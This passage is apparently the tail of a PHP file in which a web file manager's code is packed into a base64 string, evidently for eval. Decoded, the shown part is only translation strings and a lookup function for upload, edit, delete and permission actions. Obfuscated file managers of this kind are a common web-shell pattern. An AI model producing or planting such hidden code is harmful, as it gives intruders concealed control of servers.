QWR2YW5jZWQgRWRpdG9yJzsNCiAgICAgICAgJHRyWydlbiddWydBY3Rpb25zJ10gICAgICAgID0gJ0FjdGlvbnMnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0ZvbGRlciBpcyBlbXB0eSddID0gJ0ZvbGRlciBpcyBlbXB0eSc7DQogICAgICAgICR0clsnZW4nXVsnVXBsb2FkJ10gICAgICAgICA9ICdVcGxvYWQnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0NhbmNlbCddICAgICAgICAgPSAnQ2FuY2VsJzsNCiAgICAgICAgJHRyWydlbiddWydJbnZlcnRTZWxlY3Rpb24nXSA9ICdJbnZlcnQgU2VsZWN0aW9uJzsNCiAgICAgICAgJHRyWydlbiddWydEZXN0aW5hdGlvbkZvbGRlciddICA9ICdEZXN0aW5hdGlvbiBGb2xkZXInOw0KICAgICAgICAkdHJbJ2VuJ11bJ0l0ZW1UeXBlJ10gICAgICAgPSAnSXRlbSBUeXBlJzsNCiAgICAgICAgJHRyWydlbiddWydJdGVtTmFtZSddICAgICAgID0gJ0l0ZW0gTmFtZSc7DQogICAgICAgICR0clsnZW4nXVsnQ3JlYXRlTm93J10gICAgICA9ICdDcmVhdGUgTm93JzsNCiAgICAgICAgJHRyWydlbiddWydEb3dubG9hZCddICAgICAgID0gJ0Rvd25sb2FkJzsNCiAgICAgICAgJHRyWydlbiddWydPcGVuJ10gICAgICAgICAgID0gJ09wZW4nOw0KICAgICAgICAkdHJbJ2VuJ11bJ1VuWmlwJ10gICAgICAgICAgPSAnVW5aaXAnOw0KICAgICAgICAkdHJbJ2VuJ11bJ1VuWmlwVG9Gb2xkZXInXSAgPSAnVW5aaXAgdG8gZm9sZGVyJzsNCiAgICAgICAgJHRyWydlbiddWydFZGl0J10gICAgICAgICAgID0gJ0VkaXQnOw0KICAgICAgICAkdHJbJ2VuJ11bJ05vcm1hbEVkaXRvciddICAgPSAnTm9ybWFsIEVkaXRvcic7DQogICAgICAgICR0clsnZW4nXVsnQmFja1VwJ10gICAgICAgICA9ICdCYWNrIFVwJzsNCiAgICAgICAgJHRyWydlbiddWydTb3VyY2VGb2xkZXInXSAgID0gJ1NvdXJjZSBGb2xkZXInOw0KICAgICAgICAkdHJbJ2VuJ11bJ0ZpbGVzJ10gICAgICAgICAgPSAnRmlsZXMnOw0KICAgICAgICAkdHJbJ2VuJ11bJ01vdmUnXSAgICAgICAgICAgPSAnTW92ZSc7DQogICAgICAgICR0clsnZW4nXVsnQ2hhbmdlJ10gICAgICAgICA9ICdDaGFuZ2UnOw0KICAgICAgICAkdHJbJ2VuJ11bJ1NldHRpbmdzJ10gICAgICAgPSAnU2V0dGluZ3MnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0xhbmd1YWdlJ10gICAgICAgPSAnTGFuZ3VhZ2UnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0Vycm9yUmVwb3J0aW5nJ10gPSAnRXJyb3IgUmVwb3J0aW5nJzsNCiAgICAgICAgJHRyWydlbiddWydTaG93SGlkZGVuRmlsZXMnXSA9ICdTaG93IEhpZGRlbiBGaWxlcyc7DQogICAgICAgICR0clsnZW4nXVsnSGVscCddICAgICAgICAgICA9ICdIZWxwJzsNCiAgICAgICAgJHRyWydlbiddWydDcmVhdGVkJ10gICAgICAgID0gJ0NyZWF0ZWQnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0hlbHAgRG9jdW1lbnRzJ10gPSAnSGVscCBEb2N1bWVudHMnOw0KICAgICAgICAkdHJbJ2VuJ11bJ1JlcG9ydCBJc3N1ZSddICAgPSAnUmVwb3J0IElzc3VlJzsNCiAgICAgICAgJHRyWydlbiddWydHZW5lcmF0ZSddICAgICAgID0gJ0dlbmVyYXRlJzsNCiAgICAgICAgJHRyWydlbiddWydGdWxsU2l6ZSddICAgICAgID0gJ0Z1bGwgU2l6ZSc7DQogICAgICAgICR0clsnZW4nXVsnSGlkZUNvbHVtbnMnXSAgICA9ICdIaWRlIFBlcm1zL093bmVyIGNvbHVtbnMnOw0KICAgICAgICAkdHJbJ2VuJ11bJ1lvdSBhcmUgbG9nZ2VkIGluJ10gPSAnWW91IGFyZSBsb2dnZWQgaW4nOw0KICAgICAgICAkdHJbJ2VuJ11bJ05vdGhpbmcgc2VsZWN0ZWQnXSAgPSAnTm90aGluZyBzZWxlY3RlZCc7DQogICAgICAgICR0clsnZW4nXVsnUGF0aHMgbXVzdCBiZSBub3QgZXF1YWwnXSAgICA9ICdQYXRocyBtdXN0IGJlIG5vdCBlcXVhbCc7DQogICAgICAgICR0clsnZW4nXVsnUmVuYW1lZCBmcm9tJ10gICAgICAgPSAnUmVuYW1lZCBmcm9tJzsNCiAgICAgICAgJHRyWydlbiddWydBcmNoaXZlIG5vdCB1bnBhY2tlZCddID0gJ0FyY2hpdmUgbm90IHVucGFja2VkJzsNCiAgICAgICAgJHRyWydlbiddWydEZWxldGVkJ10gICAgICAgICAgICA9ICdEZWxldGVkJzsNCiAgICAgICAgJHRyWydlbiddWydBcmNoaXZlIG5vdCBjcmVhdGVkJ10gPSAnQXJjaGl2ZSBub3QgY3JlYXRlZCc7DQogICAgICAgICR0clsnZW4nXVsnQ29waWVkIGZyb20nXSAgICAgICAgPSAnQ29waWVkIGZyb20nOw0KICAgICAgICAkdHJbJ2VuJ11bJ1Blcm1pc3Npb25zIGNoYW5nZWQnXSA9ICdQZXJtaXNzaW9ucyBjaGFuZ2VkJzsNCiAgICAgICAgJHRyWydlbiddWyd0byddICAgICAgICAgICAgICAgICA9ICd0byc7DQogICAgICAgICR0clsnZW4nXVsnU2F2ZWQgU3VjY2Vzc2Z1bGx5J10gPSAnU2F2ZWQgU3VjY2Vzc2Z1bGx5JzsNCiAgICAgICAgJHRyWydlbiddWydub3QgZm91bmQhJ10gICAgICAgICA9ICdub3QgZm91bmQhJzsNCiAgICAgICAgJHRyWydlbiddWydGaWxlIFNhdmVkIFN1Y2Nlc3NmdWxseSddICAgID0gJ0ZpbGUgU2F2ZWQgU3VjY2Vzc2Z1bGx5JzsNCiAgICAgICAgJHRyWydlbiddWydBcmNoaXZlJ10gICAgICAgICAgICA9ICdBcmNoaXZlJzsNCiAgICAgICAgJHRyWydlbiddWydQZXJtaXNzaW9ucyBub3QgY2hhbmdlZCddICAgID0gJ1Blcm1pc3Npb25zIG5vdCBjaGFuZ2VkJzsNCiAgICAgICAgJHRyWydlbiddWydTZWxlY3QgZm9sZGVyJ10gICAgICA9ICdTZWxlY3QgZm9sZGVyJzsNCiAgICAgICAgJHRyWydlbiddWydTb3VyY2UgcGF0aCBub3QgZGVmaW5lZCddICAgID0gJ1NvdXJjZSBwYXRoIG5vdCBkZWZpbmVkJzsNCiAgICAgICAgJHRyWydlbiddWydhbHJlYWR5IGV4aXN0cyddICAgICA9ICdhbHJlYWR5IGV4aXN0cyc7DQogICAgICAgICR0clsnZW4nXVsnRXJyb3Igd2hpbGUgbW92aW5nIGZyb20nXSAgICA9ICdFcnJvciB3aGlsZSBtb3ZpbmcgZnJvbSc7DQogICAgICAgICR0clsnZW4nXVsnQ3JlYXRlIGFyY2hpdmU/J10gICAgPSAnQ3JlYXRlIGFyY2hpdmU/JzsNCiAgICAgICAgJHRyWydlbiddWydJbnZhbGlkIGZpbGUgb3IgZm9sZGVyIG5hbWUnXSAgICA9ICdJbnZhbGlkIGZpbGUgb3IgZm9sZGVyIG5hbWUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0FyY2hpdmUgdW5wYWNrZWQnXSAgID0gJ0FyY2hpdmUgdW5wYWNrZWQnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0ZpbGUgZXh0ZW5zaW9uIGlzIG5vdCBhbGxvd2VkJ10gID0gJ0ZpbGUgZXh0ZW5zaW9uIGlzIG5vdCBhbGxvd2VkJzsNCiAgICAgICAgJHRyWydlbiddWydSb290IHBhdGgnXSAgICAgICAgICA9ICdSb290IHBhdGgnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0Vycm9yIHdoaWxlIHJlbmFtaW5nIGZyb20nXSAgPSAnRXJyb3Igd2hpbGUgcmVuYW1pbmcgZnJvbSc7DQogICAgICAgICR0clsnZW4nXVsnRmlsZSBub3QgZm91bmQnXSAgICAgPSAnRmlsZSBub3QgZm91bmQnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0Vycm9yIHdoaWxlIGRlbGV0aW5nIGl0ZW1zJ10gPSAnRXJyb3Igd2hpbGUgZGVsZXRpbmcgaXRlbXMnOw0KICAgICAgICAkdHJbJ2VuJ11bJ01vdmVkIGZyb20nXSAgICAgICAgID0gJ01vdmVkIGZyb20nOw0KICAgICAgICAkdHJbJ2VuJ11bJ0dlbmVyYXRlIG5ldyBwYXNzd29yZCBoYXNoJ10gPSAnR2VuZXJhdGUgbmV3IHBhc3N3b3JkIGhhc2gnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0xvZ2luIGZhaWxlZC4gSW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCddID0gJ0xvZ2luIGZhaWxlZC4gSW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCc7DQogICAgICAgICR0clsnZW4nXVsncGFzc3dvcmRfaGFzaCBub3Qgc3VwcG9ydGVkLCBVcGdyYWRlIFBIUCB2ZXJzaW9uJ10gPSAncGFzc3dvcmRfaGFzaCBub3Qgc3VwcG9ydGVkLCBVcGdyYWRlIFBIUCB2ZXJzaW9uJzsNCiAgICAgICAgJHRyWydlbiddWydBZHZhbmNlZCBTZWFyY2gnXSAgICA9ICdBZHZhbmNlZCBTZWFyY2gnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0Vycm9yIHdoaWxlIGNvcHlpbmcgZnJvbSddICAgID0gJ0Vycm9yIHdoaWxlIGNvcHlpbmcgZnJvbSc7DQogICAgICAgICR0clsnZW4nXVsnSW52YWxpZCBjaGFyYWN0ZXJzIGluIGZpbGUgbmFtZSddICAgICAgICAgICAgICAgID0gJ0ludmFsaWQgY2hhcmFjdGVycyBpbiBmaWxlIG5hbWUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0ZJTEUgRVhURU5TSU9OIEhBUyBOT1QgU1VQUE9SVEVEJ10gICAgICAgICAgICAgICA9ICdGSUxFIEVYVEVOU0lPTiBIQVMgTk9UIFNVUFBPUlRFRCc7DQogICAgICAgICR0clsnZW4nXVsnU2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlciBkZWxldGVkJ10gICAgICAgICAgICAgID0gJ1NlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXIgZGVsZXRlZCc7DQogICAgICAgICR0clsnZW4nXVsnRXJyb3Igd2hpbGUgZmV0Y2hpbmcgYXJjaGl2ZSBpbmZvJ10gICAgICAgICAgICAgID0gJ0Vycm9yIHdoaWxlIGZldGNoaW5nIGFyY2hpdmUgaW5mbyc7DQogICAgICAgICR0clsnZW4nXVsnRGVsZXRlIHNlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXJzPyddICAgICAgICAgICAgID0gJ0RlbGV0ZSBzZWxlY3RlZCBmaWxlcyBhbmQgZm9sZGVycz8nOw0KICAgICAgICAkdHJbJ2VuJ11bJ1NlYXJjaCBmaWxlIGluIGZvbGRlciBhbmQgc3ViZm9sZGVycy4uLiddICAgICAgICA9ICdTZWFyY2ggZmlsZSBpbiBmb2xkZXIgYW5kIHN1YmZvbGRlcnMuLi4nOw0KICAgICAgICAkdHJbJ2VuJ11bJ0FjY2VzcyBkZW5pZWQuIElQIHJlc3RyaWN0aW9uIGFwcGxpY2FibGUnXSAgICAgICA9ICdBY2Nlc3MgZGVuaWVkLiBJUCByZXN0cmljdGlvbiBhcHBsaWNhYmxlJzsNCiAgICAgICAgJHRyWydlbiddWydJbnZhbGlkIGNoYXJhY3RlcnMgaW4gZmlsZSBvciBmb2xkZXIgbmFtZSddICAgICAgPSAnSW52YWxpZCBjaGFyYWN0ZXJzIGluIGZpbGUgb3IgZm9sZGVyIG5hbWUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ09wZXJhdGlvbnMgd2l0aCBhcmNoaXZlcyBhcmUgbm90IGF2YWlsYWJsZSddICAgICA9ICdPcGVyYXRpb25zIHdpdGggYXJjaGl2ZXMgYXJlIG5vdCBhdmFpbGFibGUnOw0KICAgICAgICAkdHJbJ2VuJ11bJ0ZpbGUgb3IgZm9sZGVyIHdpdGggdGhpcyBwYXRoIGFscmVhZHkgZXhpc3RzJ10gICA9ICdGaWxlIG9yIGZvbGRlciB3aXRoIHRoaXMgcGF0aCBhbHJlYWR5IGV4aXN0cyc7DQogICAgICAgICR0clsnZW4nXVsnQXJlIHlvdSBzdXJlIHdhbnQgdG8gcmVuYW1lPyddICAgICAgICAgICAgICAgICAgID0gJ0FyZSB5b3Ugc3VyZSB3YW50IHRvIHJlbmFtZT8nOw0KICAgICAgICAkdHJbJ2VuJ11bJ0FyZSB5b3Ugc3VyZSB3YW50IHRvJ10gICAgICAgICAgICAgICAgICAgICAgICAgICA9ICdBcmUgeW91IHN1cmUgd2FudCB0byc7DQoNCiAgICAgICAgJGkxOG4gPSBmbV9nZXRfdHJhbnNsYXRpb25zKCR0cik7DQogICAgICAgICR0ciA9ICRpMThuID8gJGkxOG4gOiAkdHI7DQoNCiAgICAgICAgaWYgKCFzdHJsZW4oJGxhbmcpKSAkbGFuZyA9ICdlbic7DQogICAgICAgIGlmIChpc3NldCgkdHJbJGxhbmddWyR0eHRdKSkgcmV0dXJuIGZtX2VuYygkdHJbJGxhbmddWyR0eHRdKTsNCiAgICAgICAgZWxzZSBpZiAoaXNzZXQoJHRyWydlbiddWyR0eHRdKSkgcmV0dXJuIGZtX2VuYygkdHJbJ2VuJ11bJHR4dF0pOw0KICAgICAgICBlbHNlIHJldHVybiAiJHR4dCI7DQogICAgfQ0KDQo/Pg=="));?>